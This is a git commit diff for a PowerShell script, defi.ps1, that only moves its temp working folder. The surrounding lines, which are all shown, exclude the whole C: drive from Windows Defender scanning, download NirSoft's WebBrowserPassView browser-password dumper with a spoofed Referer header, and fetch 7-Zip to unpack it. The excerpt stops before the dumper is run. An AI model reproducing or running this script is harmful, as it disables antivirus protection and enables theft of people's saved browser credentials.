4df036514f6b1a81ebcf1c504f279519b4f99bdd
pedrito12a <153040660+pedrito12a@users.noreply.github.com>
2024-02-29 23:30:26 +0100

    Update defi.ps1

--- defi.ps1
+++ defi.ps1
@@ -1,8 +1,8 @@
 Add-MpPreference -ExclusionPath “C:”
 
-rm -r \temp
-mkdir \temp
-cd \temp
+rm -r \temp\apt
+mkdir \temp\apt
+cd \temp\apt
 Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
 Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
 Expand-Archive 7z.zip
